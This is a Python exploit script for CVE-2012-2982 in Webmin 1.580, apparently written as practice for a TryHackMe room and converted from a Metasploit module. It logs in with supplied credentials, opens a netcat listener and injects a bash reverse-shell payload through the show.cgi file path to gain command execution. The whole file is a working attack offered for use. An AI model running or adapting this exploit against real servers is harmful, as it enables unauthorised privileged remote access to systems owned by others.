# CVE: 2012-2982
# Metasploit Conversion
# MSF Module: https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/webapp/webmin_show_cgi_exec.rb
# Author: SlizBinksman

#!/usr/bin/python

import argparse
import random
import string
import requests
from sys import exit
from socket import error
from subprocess import run

webSession = requests.session()

lhost = ''
lport = 4444

payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"

def banner():
    banner = """
 __    __    ___  ____   ___ ___  ____  ____      
|  |__|  |  /  _]|    \ |   |   ||    ||    \     
|  |  |  | /  [_ |  o  )| _   _ | |  | |  _  |    
|  |  |  ||    _]|     ||  \_/  | |  | |  |  |    
|  `  '  ||   [_ |  O  ||   |   | |  | |  |  |    
 \      / |     ||     ||   |   | |  | |  |  |    
  \_/\_/  |_____||_____||___|___||____||__|__| Auth RCE
    
[+] CVE:                    2012-2982
[+] Vulnerable Version:     1.580
[+] Vuln Description:       Allow An Authenticated User To Execute System Commands As A Privileged User
[+] Discovery:              Could Not Find
[+] MSF Module:             https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/webapp/webmin_show_cgi_exec.rb
[+] Author:                 https://github.com/SlizBinksman

[!] Note:                   SlizBinksman did not discover this vulnerability. This
                            script is an MSF conversion to python from ruby as a way
                            to practice exploitation. This was made based on the
                            'Intro PoC Scripting' room on TryHackMe.com. Sliz IS NOT
                            RESPONSIBLE for YOUR ACTIONS with this script. 
---------------------------------------------------------------------------------------
"""
    print(banner)
    return login()

def randomString():
    lettersAndNumbers = string.ascii_letters + string.digits
    randomString = (''.join(random.choice(lettersAndNumbers) for i in range(1,6)))
    return randomString

def login():
    try:
        print(f'[*] Attempting To Authenticate To Webmin Panel @ {args.URL}/session_login.cgi')
        loginData = {
            "page":"%2F",
            "user":args.Username,
            "pass":args.Password,
        }
        loginRequest = webSession.post(url=f"{args.URL}/session_login.cgi",cookies={"testing":"1"},data=loginData,allow_redirects=False)
        loginCookie = loginRequest.cookies.get("sid")
        return checkStatus(loginRequest.status_code,loginCookie)

    except error:
        print('[-] Could Not Connect To Server')

def checkStatus(responseCode,cookie):
    if responseCode == int(302):
        print('[*] Authentication Successful!')
        return exploit(cookie)
    else:
        print('[-] Unable To Authenticate')
        exit('[!] Quitting....')

def exploit(cookie):
    print('[*] Opening Netcat Listener & Executing Payload!')
    run(f'gnome-terminal -e "nc -lvnp {lport}"',shell=True,capture_output=True)
    webSession.get(f"{args.URL}/file/show.cgi/bin/{randomString()}|{payload}|",data={"cookie":f"sid={cookie}"},allow_redirects=False)

if __name__ == '__main__':
    mainarguments = argparse.ArgumentParser()
    mainarguments.add_argument('URL',help='URL Hosting Webmin',type=str)
    mainarguments.add_argument('Username',help='Webmin Username',type=str)
    mainarguments.add_argument('Password',help='Webmin Password',type=str)
    args = mainarguments.parse_args()

    try:
        banner()
    except KeyboardInterrupt:
        exit('[!] Aborting...')